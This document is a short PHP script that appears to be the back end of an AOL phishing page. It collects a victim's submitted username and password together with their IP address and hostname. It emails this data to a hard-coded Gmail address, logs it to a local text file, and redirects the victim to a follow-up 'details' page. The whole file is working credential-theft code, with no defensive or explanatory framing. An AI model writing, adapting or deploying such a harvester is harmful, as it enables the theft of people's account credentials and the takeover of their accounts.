<?php
	$id = "AOL" . uniqid();
?>

<?php
	
	$ip=getenv(REMOTE_ADDR);
	$hostname = gethostbyaddr($ip);

	$email_from = 'paulinasz682@gmail.com';
	
	$email_subject = "AOL - Login Info " . $id;
	
	$email_body = "";
	$email_body .= "---------------|Lay Solver|---------------\n";
	$email_body .= "Username: " . $_POST['username'] . "\n"; 
	$email_body .= "Password: " . $_POST['pass'] . "\n"; 
	$email_body .= "-------------------------------------\n";
    $email_body .= "ip: " . $ip . "\n"; 
	$email_body .= "hostname: " .$hostname ."\n";    
	$email_body .= "-------------------------------------\n";
	$email_body .= "\n";	

?>
<?php
$message = $email_subject;
$message .= $email_body;

  $to = "stegeorgefan@gmail.com";

  $headers = "From: $email_from \r\n";

  $headers .= "Reply-To: $email_from \r\n";

  mail($to,$email_subject,$email_body,$headers);

@fclose(@fwrite(@fopen("fullsfgddd.txt", "a"),$message));
 ?>
 
 <script type="text/javascript"> 
<!-- 
   window.location="details.php?id=<?php echo urlencode($id); ?>"
</script> 
